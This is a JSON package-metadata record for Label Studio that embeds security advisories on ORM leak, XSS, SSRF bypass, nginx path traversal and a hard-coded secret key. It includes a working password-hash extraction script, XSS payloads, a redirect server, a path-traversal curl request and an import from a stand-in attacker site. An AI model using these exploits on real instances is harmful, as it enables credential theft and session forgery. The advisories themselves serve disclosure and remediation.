\"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.7.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.7.0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.10.0)","google-auth (==2.11.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.3)","Django (==3.2.16)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.48rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.7.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"bed0a74f82acb88f310bc1b08e45381311729db07c2df9a32081fa388498b905","md5":"e9480233600899bc6b86ffbf61819e2d","sha256":"ed9927e3b912ba7d36869cb5513bc4cde8c332f0dc8f58b7bd19175469e93374"},"downloads":-1,"filename":"label_studio-1.7.0-py3-none-any.whl","has_sig":false,"md5_digest":"e9480233600899bc6b86ffbf61819e2d","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":44575931,"upload_time":"2022-12-15T15:19:51","upload_time_iso_8601":"2022-12-15T15:19:51.841951Z","url":"https://files.pythonhosted.org/packages/be/d0/a74f82acb88f310bc1b08e45381311729db07c2df9a32081fa388498b905/label_studio-1.7.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"64ff1a4555ffccd36833305317255b5bf20818dfdee2506a4f34f3426f45a3eb","md5":"90de964af79bfb6c212c4c41a194d1d5","sha256":"8cafd32ec93f7285047ef09c230c8a0a07a5f5422341d7f2cd5f66bac7ec14fc"},"downloads":-1,"filename":"label-studio-1.7.0.tar.gz","has_sig":false,"md5_digest":"90de964af79bfb6c212c4c41a194d1d5","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":43558182,"upload_time":"2022-12-15T15:19:55","upload_time_iso_8601":"2022-12-15T15:19:55.865499Z","url":"https://files.pythonhosted.org/packages/64/ff/1a4555ffccd36833305317255b5bf20818dfdee2506a4f34f3426f45a3eb/label-studio-1.7.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit 